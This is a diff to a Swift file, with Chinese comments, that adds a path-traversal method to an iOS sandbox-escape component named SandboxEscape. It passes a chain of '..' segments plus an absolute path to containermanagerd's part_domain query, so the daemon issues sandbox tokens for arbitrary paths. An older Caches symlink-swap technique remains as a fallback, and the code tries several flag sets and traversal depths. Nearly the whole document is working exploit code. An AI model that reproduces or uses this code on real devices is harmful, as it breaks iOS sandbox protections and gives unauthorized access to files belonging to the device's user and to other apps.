@@ -127,6 +127,9 @@ enum SandboxEscape {
     private typealias QuerySetIDs = @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?) -> Void
     private typealias QuerySetFlags = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
     private typealias QuerySetPart = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
+    /// part_domain 是 containermanagerd 内部解析的相对路径字符串。
+    /// 传 `..…/绝对路径` 就能让 part 落到任意位置，不需要真的把 Caches 移走。
+    private typealias QuerySetPartDomain = @convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>?) -> Void
     private typealias QueryGetSingle = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?
     private typealias QueryFree = @convention(c) (UnsafeMutableRawPointer?) -> Void
     private typealias CopyToken = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutablePointer<CChar>?
@@ -153,6 +156,7 @@ enum SandboxEscape {
         static let querySetClass = load("container_query_set_class", in: manager, as: QuerySetClass.self)
         static let querySetGroups = load("container_query_set_group_identifiers", in: manager, as: QuerySetIDs.self)
         static let querySetPart = load("container_query_operation_set_part", in: manager, as: QuerySetPart.self)
+        static let querySetPartDomain = load("container_query_operation_set_part_domain", in: manager, as: QuerySetPartDomain.self)
         static let querySetFlags = load("container_query_operation_set_flags", in: manager, as: QuerySetFlags.self)
         static let querySingle = load("container_query_get_single_result", in: manager, as: QueryGetSingle.self)
         static let queryFree = load("container_query_free", in: manager, as: QueryFree.self)
@@ -278,6 +282,12 @@ enum SandboxEscape {
             batchDepth += 1
             return
         }
+        // part_domain 走通时不需要交换：保持 Caches 原样，
+        // 扫描被系统中断时也不会留下一个指向别处的符号链接。
+        if !partDomainBroken, Symbols.querySetPartDomain != nil {
+            batchDepth = 1
+            return
+        }
         guard let base = groupContainerPath(group),
               let swap = try? CacheSwap(library: base + "/Library") else { return }
         batch = Batch(group: group, swap: swap, started: Date())
@@ -348,6 +358,66 @@ enum SandboxEscape {
             throw Failure(code: -1, message: "App Group 容器不存在，签名里缺少 \(group) 的 entitlement")
         }
 
+        // iOS 27 先试标准 flags，iOS 26 先试备用 flags；成功的那组会记下来。
+        let preferAlt = preferredAltFlags()
+        let candidates: [UInt64] = preferAlt
+            ? [altFlags, standardFlags]
+            : [standardFlags, altFlags]
+
+        var lastCode: Int64 = -5
+
+        // ① part_domain：让 containermanagerd 自己把 part 解析到目标路径。
+        // 不移动 Caches，也不建符号链接。iOS 27.3 上 Caches 交换会让
+        // container_copy_sandbox_token 返回 NULL，这条不会。
+        let levels = partDomainLevels(group: group)
+        var denied = 0
+        if !partDomainBroken, Symbols.querySetPartDomain != nil {
+            for flags in candidates {
+                for level in levels {
+                    let handle: Int64
+                    do {
+                        handle = try partDomainToken(
+                            path: canonical, group: group, levels: level, flags: flags
+                        )
+                    } catch let failure as Failure {
+                        lastCode = failure.code
+                        if failure.code == -5 || failure.code == -6 { denied += 1 }
+                        continue
+                    }
+
+                    guard opens(canonical) else {
+                        release(handle)
+                        lastCode = -8
+                        continue
+                    }
+
+                    var writable = false
+                    if requireWrite {
+                        writable = canWrite(canonical, isDirectory: isDirectory)
+                        guard writable else {
+                            release(handle)
+                            lastCode = -8
+                            continue
+                        }
+                    }
+
+                    let session = EscapeSession(
+                        target: canonical, group: group, handle: handle, writable: writable
+                    )
+                    if pinned {
+                        Self.pin(session)
+                    } else {
+                        remember(session, key: canonical)
+                    }
+                    noteWorkingFlags(flags == altFlags)
+                    return session
+                }
+            }
+            // 所有层数 × 所有 flags 都被 daemon 明确拒绝：本机不支持这条通道，别再试
+            if denied == candidates.count * levels.count { partDomainBroken = true }
+        }
+
+        // ② Caches 符号链接交换：旧路径，26.x 与 27.0–27.2 上有效。
         // 批量作用域内复用同一个交换，避免每个目标都移走/移回 Caches。
         let shared = activeSwap(for: group)
         let owned: CacheSwap?
@@ -362,13 +432,6 @@ enum SandboxEscape {
         }
         defer { owned?.finish() }
 
-        // iOS 27 先试标准 flags，iOS 26 先试备用 flags；成功的那组会记下来。
-        let preferAlt = preferredAltFlags()
-        let candidates: [UInt64] = preferAlt
-            ? [altFlags, standardFlags]
-            : [standardFlags, altFlags]
-
-        var lastCode: Int64 = -5
         for flags in candidates {
             let handle: Int64
             do {
@@ -448,6 +511,78 @@ enum SandboxEscape {
 
     private static let containerClassAppGroup: UInt64 = 7
     private static let partCaches: UInt64 = 3
+
+    /// part_domain 的 `..` 层数：`<group>/Library/Caches` 回到卷根要经过的层数。
+    /// 正常是 9，但不同系统版本的 AppGroup 目录深度可能差一层，所以把 ±1 一起试。
+    private static func partDomainLevels(group: String) -> [Int] {
+        guard let base = groupContainerPath(group) else { return [9] }
+        let depth = base.split(separator: "/").count + 2
+        return [depth, depth - 1, depth + 1]
+    }
+
+    /// 用 part_domain 的相对路径穿越签发，**不移动 Caches**。
+    ///
+    /// containermanagerd 解析 part 时把 domain 字符串和自己的容器路径直接拼接，
+    /// 不校验 `..` 是否越界。part=3 的基点是 `<group>/Library/Caches`，
+    /// 上溯 `levels` 层到卷根后接目标绝对路径，daemon 就把 token 发给目标。
+    ///
+    /// 这是 3105 的主路径（`bad_query.c` 的 `query_set_part_domain`）。
+    /// 我们原来用的 Caches 符号链接交换在 iOS 27.3 上会让
+    /// `container_copy_sandbox_token` 返回 NULL（-6），而这条仍然签发。
+    private static func partDomainToken(
+        path: String,
+        group: String,
+        levels: Int,
+        flags: UInt64
+    ) throws -> Int64 {
+        guard let create = Symbols.queryCreate,
+              let setClass = Symbols.querySetClass,
+              let setGroups = Symbols.querySetGroups,
+              let setPart = Symbols.querySetPart,
+              let setPartDomain = Symbols.querySetPartDomain,
+              let setFlags = Symbols.querySetFlags,
+              let single = Symbols.querySingle,
+              let freeQuery = Symbols.queryFree,
+              let copyToken = Symbols.copyToken,
+              let xpcString = Symbols.xpcString,
+              let consume = Symbols.consume
+        else {
+            throw Failure(code: -2, message: "系统缺少 part_domain 符号")
+        }
+
+        guard let query = create() else {
+            throw Failure(code: -3, message: "创建容器查询失败")
+        }
+        defer { freeQuery(query) }
+
+        setClass(query, containerClassAppGroup)
+        let identifier = xpcString(group)
+        setGroups(query, identifier)
+        setPart(query, partCaches)
+        setFlags(query, flags)
+
+        let domain = Array(repeating: "..", count: levels).joined(separator: "/") + path
+        let result = domain.withCString { pointer -> UnsafeMutableRawPointer? in
+            setPartDomain(query, pointer)
+            return single(query)
+        }
+        guard let result else {
+            throw Failure(code: -5, message: "part_domain 被拒绝（上溯 \(levels) 层）")
+        }
+        guard let token = copyToken(result) else {
+            throw Failure(code: -6, message: "part_domain 有结果但没有 token")
+        }
+        defer { free(token) }
+
+        let handle = consume(token)
+        guard handle >= 0 else {
+            throw Failure(code: handle, message: describe(handle))
+        }
+        return handle
+    }
+
+    /// 签发通道。part_domain 不动磁盘，成功一次之后就一直用它。
+    private static var partDomainBroken = false
 
     /// 发一次查询并 consume 拿到的 token。
     /// 前置条件：`<group>/Library/Caches` 此刻已是指向目标路径的符号链接，且已持有 gate。
